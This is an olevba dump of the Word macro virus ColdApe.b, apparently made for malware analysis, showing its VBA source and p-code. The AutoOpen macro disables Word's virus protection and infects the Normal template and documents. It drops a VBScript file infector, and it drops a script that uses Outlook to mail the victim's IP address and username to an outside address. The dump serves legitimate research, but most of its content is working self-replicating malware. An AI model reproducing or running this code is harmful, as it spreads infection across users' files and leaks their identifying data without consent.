olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.ColdApe.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.ColdApe.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'AVM
On Error Resume Next
Dim DC, IT As Integer
a = ActiveDocument.Saved
Application.EnableCancelKey = 1 And 0
Options.VirusProtection = 1 And 0
Options.ConfirmConversions = 1 And 0
Options.SaveNormalPrompt = 1 And 0
gen = 35
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'AVM" Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines, "'" & Application.UserName & " Loves Nicky F. Also! " & Now
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines - 1))
gen = gen + 1
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 10, "gen =" & Str(gen)
End If
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'AVM" Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines - 1))
gen = gen + 1
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 10, "gen =" & Str(gen)
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
IT = (Day(Now))
If IT >= 30 Then IT = 0
DC = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "AVM-DC")
If DC = "" Or DC < IT Or IT = 0 Then
GoOk = True
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "AVM-DC") = IT
End If
TestCon = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "AVM-VBS")
If System.PrivateProfileString("", "HKEY_CLASSES_ROOT\VBSFile\ScriptEngine", "") = "VBScript" Then SIY = True
If SIY = True And TestCon <> "Done" Then
Open "c:\happy.vbs" For Output As 1
Print #1, "'§"
Print #1, ""
Print #1, "On Error Resume Next"
Print #1, "Dim IV6, U187, IV7, IV1, IV2, IV3, IV4"
Print #1, "Dim T111"
Print #1, "Dim IV5(200)"
Print #1, "Dim XR"
Print #1, "Set WSHShell = Wscript.CreateObject(""Wscript.Shell"")"
Print #1, "Set WshSysEnv = WSHShell.Environment(""Process"")"
Print #1, "IV10 = WshSysEnv(""Path"")"
Print #1, "IV7 = WSHShell.ExpandEnvironmentStrings(""%windir%\avm.vbs"")"
Print #1, "IV1 = Wscript.ScriptFullName"
Print #1, "Set IV6 = CreateObject(""Scripting.FileSystemObject"")"
Print #1, "XR = 1"
Print #1, "T11 = Wscript.ScriptFullName"
Print #1, "For x = Len(IV10) To 1 Step -1"
Print #1, "IV4 = Mid(IV10, x, 1)"
Print #1, "If IV4 <> "";"" Then"
Print #1, "IV5(XR) = IV4 + IV5(XR)"
Print #1, "ElseIf IV4 = "";"" Then"
Print #1, "IV5(XR) = IV5(XR) + ""\"""
Print #1, "XR = XR + 1"
Print #1, "End If"
Print #1, "Next"
Print #1, "IV5(XR) = IV5(XR) + ""\"""
Print #1, "IV5(XR + 1) = WSHShell.SpecialFolders(""Desktop"") + ""\"""
Print #1, "IV5(XR + 2) = WSHShell.SpecialFolders(""MyDocuments"") + ""\"""
Print #1, "IV5(XR + 3) = WSHShell.SpecialFolders(""Startup"") + ""\"""
Print #1, "IV5(XR + 4) = Left(T11, InStrRev(T11, ""\""))"
Print #1, "Set TS = IV6.OpenTextFile(T11, 1)"
Print #1, "IV9 = TS.ReadAll"
Print #1, "TS.Close"
Print #1, "IV8 = Chr(167)"
Print #1, "endIV8 = ""'"" & IV8"
Print #1, "For x = Len(IV9) To 1 Step -1"
Print #1, "If Mid(IV9, x, 1) = IV8 Then"
Print #1, "x = 1"
Print #1, "IV3 = endIV8 + IV3"
Print #1, "ElseIf Mid(IV9, x, 1) <> IV8 Then"
Print #1, "IV3 = Mid(IV9, x, 1) + IV3"
Print #1, "End If"
Print #1, "Next"
Print #1, "For y = 1 To (XR + 4)"
Print #1, "For Each Target In IV6.GetFolder(IV5(y)).Files"
Print #1, "If UCase(Right(Target.Name, 3)) = ""VBS"" Then"
Print #1, "IV11 = """""
Print #1, "Set TS = IV6.OpenTextFile(IV5(y) & Target.Name, 1)"
Print #1, "IV11 = TS.ReadAll"
Print #1, "TS.Close"
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
Print #1, "T111 = True"
Print #1, "Else"
Print #1, "T111 = False"
Print #1, "End If"
Print #1, "End Function"
Print #1, "' Nick ""The Love Monkey"" Virus Package by ALT-F4 and ALT-F11 for the Alternative Virus Mafia"
Print #1, "'¥"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "AVM-VBS") = "Done"
Close 1
Shell "wscript c:\happy.vbs", vbHide
End If
If SIY = True And GoOk = True Then
If Dir("c:\A4.vbs") = "" Then
Open "c:\A4.vbs" For Output As 1
Print #1, "Dim theApp, theNameSpace, theMailItem"
Print #1, "Dim IPSocket"
Print #1, "On Error Resume Next"
Print #1, "Set IPSocket = CreateObject(""MSWinsock.Winsock"")"
Print #1, "IPADDY = IPSocket.LocalIP"
Print #1, "set BOB = CreateObject(""Wscript.Network"")"
Print #1, "For x = 1 To 2"
Print #1, "If x = 1 Then EMADDY = ""avm@redneck.efga.org"" Else EMADDY = ""nick@virusbtn.com"""
Print #1, "if x = 1 then MSGBDY = IPADDY & " & Chr(34) & Str(gen) & " " & Now & Chr(34) & " else MSGBDY = ""Dear Nicky... my name is " & Application.UserName & " and I want to make hot monkey love with you. You anti-virus stud!"""
Print #1, "Set theApp = WScript.CreateObject(""Outlook.Application"")"
Print #1, "Set theNameSpace = theApp.GetNameSpace(""MAPI"")"
Print #1, "theNameSpace.Logon ""profile"", ""password"""
Print #1, "Set theMailItem = theApp.CreateItem(0)"
Print #1, "theMailItem.Recipients.Add EMADDY"
Print #1, "theMailItem.Subject = BOB.Username"
Print #1, "theMailItem.Body = MSGBDY"
Print #1, "theMailItem.Send"
Print #1, "theNameSpace.Logoff"
Print #1, "Next"
Close 1
End If
Shell "wscript c:\a4.vbs", vbHide
End If
If ActiveDocument.Saved <> a Then ActiveDocument.Saved = a
' Nick "The Love Monkey" v2 Virus Package by ALT-F4 and ALT-F11 for the Alternative Virus Mafia
'Hugh G. Rection Loves Nicky F. Also! 11/14/98 10:56:30 AM
'Sylvio Proulx Loves Nicky F. Also! 11/23/98 8:45:13 PM
'yosh Loves Nicky F. Also! 11/12/98 7:03:01
'MOONEY Loves Nicky F. Also! 1/03/99 19:35:22
End Sub
Private Sub Document_New()

'BoormaG Loves Nicky F. Also! 15/03/1999 7:38:47 AM
'RossitD Loves Nicky F. Also! 16/03/1999 9:51:33 AM
'Therese Rusell Loves Nicky F. Also! 16/03/1999 15:46:29
'SmithDi Loves Nicky F. Also! 18/03/1999 8:47:59 AM
'KearnsB Loves Nicky F. Also! 13/04/1999 2:29:45 PM
'DunneJ Loves Nicky F. Also! 19/04/99 8:48:09
'Anthony Gao Loves Nicky F. Also! 28/04/1999 15:15:56
'U004006 Loves Nicky F. Also! 30/04/1999 15:07:51
'Westpac Banking Corporation Loves Nicky F. Also! 06/05/1999 13:29:30
'WBC Loves Nicky F. Also! 07/05/1999 8:14:06
'Sharon Hawkins Loves Nicky F. Also! 20/05/1999 9:33:10
'Markus Schmall Loves Nicky F. Also! 6/4/99 2:59:06 PM
'MACRO Loves Nicky F. Also! 10/19/2099 6:22:17 PM
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.ColdApe.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 12788 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	QuoteRem 0x0000 0x0003 "AVM"
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Dim 
' 	VarDefn DC
' 	VarDefn IT (As Integer)
' Line #4:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St a 
' Line #5:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	And 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #6:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	And 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	And 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #8:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	And 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #9:
' 	LitDI2 0x0023 
' 	St gen 
' Line #10:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'AVM"
' 	Ne 
' 	IfBlock 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0016 " Loves Nicky F. Also! "
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #12:
' 	LitStr 0x000F "Sub AutoClose()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #13:
' 	Ld gen 
' 	LitDI2 0x0001 
' 	Add 
' 	St gen 
' Line #14:
' 	LitDI2 0x000A 
' 	LitStr 0x0005 "gen ="
' 	Ld gen 
' 	ArgsLd Str 0x0001 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'AVM"
' 	Ne 
' 	IfBlock 
' Line #17:
' 	LitStr 0x000E "Sub AutoOpen()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #18:
' 	Ld gen 
' 	LitDI2 0x0001 
' 	Add 
' 	St gen 
' Line #19:
' 	LitDI2 0x000A 
' 	LitStr 0x0005 "gen ="
' 	Ld gen 
' 	ArgsLd Str 0x0001 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #20:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Paren 
' 	St IT 
' Line #23:
' 	Ld IT 
' 	LitDI2 0x001E 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St IT 
' 	EndIf 
' Line #24:
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0"
' 	LitStr 0x0006 "AVM-DC"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St DC 
' Line #25:
' 	Ld DC 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Ld DC 
' 	Ld IT 
' 	Lt 
' 	Or 
' 	Ld IT 
' 	LitDI2 0x0000 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #26:
' 	LitVarSpecial (True)
' 	St GoOk 
' Line #27:
' 	Ld IT 
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0"
' 	LitStr 0x0006 "AVM-DC"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0"
' 	LitStr 0x0007 "AVM-VBS"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St TestCon 
' Line #30:
' 	LitStr 0x0000 ""
' 	LitStr 0x0026 "HKEY_CLASSES_ROOT\VBSFile\ScriptEngine"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0008 "VBScript"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St SIY 
' 	EndIf 
' Line #31:
' 	Ld SIY 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld TestCon 
' 	LitStr 0x0004 "Done"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #32:
' 	LitStr 0x000C "c:\happy.vbs"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #33:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0002 "'§"
' 	PrintItemNL 
' Line #34:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #35:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On Error Resume Next"
' 	PrintItemNL 
' Line #36:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "Dim IV6, U187, IV7, IV1, IV2, IV3, IV4"
' 	PrintItemNL 
' Line #37:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "Dim T111"
' 	PrintItemNL 
' Line #38:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "Dim IV5(200)"
' 	PrintItemNL 
' Line #39:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Dim XR"
' 	PrintItemNL 
' Line #40:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "Set WSHShell = Wscript.CreateObject("Wscript.Shell")"
' 	PrintItemNL 
' Line #41:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002F "Set WshSysEnv = WSHShell.Environment("Process")"
' 	PrintItemNL 
' Line #42:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "IV10 = WshSysEnv("Path")"
' 	PrintItemNL 
' Line #43:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003B "IV7 = WSHShell.ExpandEnvironmentStrings("%windir%\avm.vbs")"
' 	PrintItemNL 
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "IV1 = Wscript.ScriptFullName"
' 	PrintItemNL 
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "Set IV6 = CreateObject("Scripting.FileSystemObject")"
' 	PrintItemNL 
' Line #46:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "XR = 1"
' 	PrintItemNL 
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "T11 = Wscript.ScriptFullName"
' 	PrintItemNL 
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "For x = Len(IV10) To 1 Step -1"
' 	PrintItemNL 
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "IV4 = Mid(IV10, x, 1)"
' 	PrintItemNL 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "If IV4 <> ";" Then"
' 	PrintItemNL 
' Line #51:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "IV5(XR) = IV4 + IV5(XR)"
' 	PrintItemNL 
' Line #52:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "ElseIf IV4 = ";" Then"
' 	PrintItemNL 
' Line #53:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "IV5(XR) = IV5(XR) + "\""
' 	PrintItemNL 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "XR = XR + 1"
' 	PrintItemNL 
' Line #55:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Next"
' 	PrintItemNL 
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "IV5(XR) = IV5(XR) + "\""
' 	PrintItemNL 
' Line #58:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "IV5(XR + 1) = WSHShell.SpecialFolders("Desktop") + "\""
' 	PrintItemNL 
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003A "IV5(XR + 2) = WSHShell.SpecialFolders("MyDocuments") + "\""
' 	PrintItemNL 
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "IV5(XR + 3) = WSHShell.SpecialFolders("Startup") + "\""
' 	PrintItemNL 
' Line #61:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002B "IV5(XR + 4) = Left(T11, InStrRev(T11, "\"))"
' 	PrintItemNL 
' Line #62:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "Set TS = IV6.OpenTextFile(T11, 1)"
' 	PrintItemNL 
' Line #63:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "IV9 = TS.ReadAll"
' 	PrintItemNL 
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "TS.Close"
' 	PrintItemNL 
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "IV8 = Chr(167)"
' 	PrintItemNL 
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "endIV8 = "'" & IV8"
' 	PrintItemNL 
' Line #67:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "For x = Len(IV9) To 1 Step -1"
' 	PrintItemNL 
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "If Mid(IV9, x, 1) = IV8 Then"
' 	PrintItemNL 
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "x = 1"
' 	PrintItemNL 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "IV3 = endIV8 + IV3"
' 	PrintItemNL 
' Line #71:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "ElseIf Mid(IV9, x, 1) <> IV8 Then"
' 	PrintItemNL 
' Line #72:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "IV3 = Mid(IV9, x, 1) + IV3"
' 	PrintItemNL 
' Line #73:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #74:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Next"
' 	PrintItemNL 
' Line #75:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "For y = 1 To (XR + 4)"
' 	PrintItemNL 
' Line #76:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002E "For Each Target In IV6.GetFolder(IV5(y)).Files"
' 	PrintItemNL 
' Line #77:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002C "If UCase(Right(Target.Name, 3)) = "VBS" Then"
' 	PrintItemNL 
' Line #78:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "IV11 = """
' 	PrintItemNL 
' Line #79:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "Set TS = IV6.OpenTextFile(IV5(y) & Target.Name, 1)"
' 	PrintItemNL 
' Line #80:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "IV11 = TS.ReadAll"
' 	PrintItemNL 
' Line #81:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "TS.Close"
' 	PrintItemNL 
' Line #82:
' 	QuoteRem 0x0000 0x0000 ""
' Line #83:
' 	QuoteRem 0x0000 0x0000 ""
' Line #84:
' 	QuoteRem 0x0000 0x0000 ""
' Line #85:
' 	QuoteRem 0x0000 0x0000 ""
' Line #86:
' 	QuoteRem 0x0000 0x0000 ""
' Line #87:
' 	QuoteRem 0x0000 0x0000 ""
' Line #88:
' 	QuoteRem 0x0000 0x0000 ""
' Line #89:
' 	QuoteRem 0x0000 0x0000 ""
' Line #90:
' 	QuoteRem 0x0000 0x0000 ""
' Line #91:
' 	QuoteRem 0x0000 0x0000 ""
' Line #92:
' 	QuoteRem 0x0000 0x0000 ""
' Line #93:
' 	QuoteRem 0x0000 0x0000 ""
' Line #94:
' 	QuoteRem 0x0000 0x0000 ""
' Line #95:
' 	QuoteRem 0x0000 0x0000 ""
' Line #96:
' 	QuoteRem 0x0000 0x0000 ""
' Line #97:
' 	QuoteRem 0x0000 0x0000 ""
' Line #98:
' 	QuoteRem 0x0000 0x0000 ""
' Line #99:
' 	QuoteRem 0x0000 0x0000 ""
' Line #100:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "T111 = True"
' 	PrintItemNL 
' Line #101:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Else"
' 	PrintItemNL 
' Line #102:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "T111 = False"
' 	PrintItemNL 
' Line #103:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #104:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "End Function"
' 	PrintItemNL 
' Line #105:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x005C "' Nick "The Love Monkey" Virus Package by ALT-F4 and ALT-F11 for the Alternative Virus Mafia"
' 	PrintItemNL 
' Line #106:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0002 "'¥"
' 	PrintItemNL 
' Line #107:
' 	LitStr 0x0004 "Done"
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0"
' 	LitStr 0x0007 "AVM-VBS"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #108:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #109:
' 	LitStr 0x0014 "wscript c:\happy.vbs"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #110:
' 	EndIfBlock 
' Line #111:
' 	Ld SIY 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld GoOk 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #112:
' 	LitStr 0x0009 "c:\A4.vbs"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #113:
' 	LitStr 0x0009 "c:\A4.vbs"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #114:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "Dim theApp, theNameSpace, theMailItem"
' 	PrintItemNL 
' Line #115:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "Dim IPSocket"
' 	PrintItemNL 
' Line #116:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On Error Resume Next"
' 	PrintItemNL 
' Line #117:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0030 "Set IPSocket = CreateObject("MSWinsock.Winsock")"
' 	PrintItemNL 
' Line #118:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "IPADDY = IPSocket.LocalIP"
' 	PrintItemNL 
' Line #119:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0029 "set BOB = CreateObject("Wscript.Network")"
' 	PrintItemNL 
' Line #120:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "For x = 1 To 2"
' 	PrintItemNL 
' Line #121:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004F "If x = 1 Then EMADDY = "avm@redneck.efga.org" Else EMADDY = "nick@virusbtn.com""
' 	PrintItemNL 
' Line #122:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "if x = 1 then MSGBDY = IPADDY & "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld gen 
' 	ArgsLd Str 0x0001 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0029 " else MSGBDY = "Dear Nicky... my name is "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0043 " and I want to make hot monkey love with you. You anti-virus stud!""
' 	Concat 
' 	PrintItemNL 
